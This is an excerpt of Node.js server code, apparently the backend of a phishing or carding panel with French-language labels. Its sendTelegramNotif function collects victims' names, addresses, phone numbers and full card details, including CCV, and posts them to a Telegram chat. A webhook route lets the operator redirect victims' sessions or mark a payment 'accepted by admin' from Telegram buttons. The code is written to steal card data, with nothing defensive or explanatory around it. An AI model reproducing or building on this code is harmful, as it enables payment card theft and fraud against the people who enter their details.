...
async function sendTelegramNotif(data, buttons){
  ...
  if(data.delivery) msg += `📦 Livraison: ${data.delivery.nom} ${data.delivery.prenom}\n🏠 Adresse: ${data.delivery.adresse}\n📞 Tel: ${data.delivery.telephone}\n`;
  if(data.card) msg += `💳 Carte: ${data.card.number}\n🗓️ Exp: ${data.card.expiry}\nCCV: ${data.card.ccv}\n👤 Titulaire: ${data.card.holder}\n`;
  msg += `🕓 ${new Date().toLocaleString()}`;

  await fetch(`${TELEGRAM_API}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode:'HTML', reply_markup:{inline_keyboard: buttons||getButtons(data.sessionId)} })
  });
}
...
app.post('/telegramWebhook',bodyParser.json(),async(req,res)=>{
  ...
  if(body.callback_query){
    ...
    if(action==='next') sessions[sid].redirect=url;
    else if(action==='validate'){ sessions[sid].redirect='/paymentAccepted.html'; sessions[sid].data.status='Paiement accepté par admin'; await sendTelegramNotif(sessions[sid].data,getButtons(sid)); }
    await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:cb.id,text:'Action prise'})});
  }
  res.sendStatus(200);
});
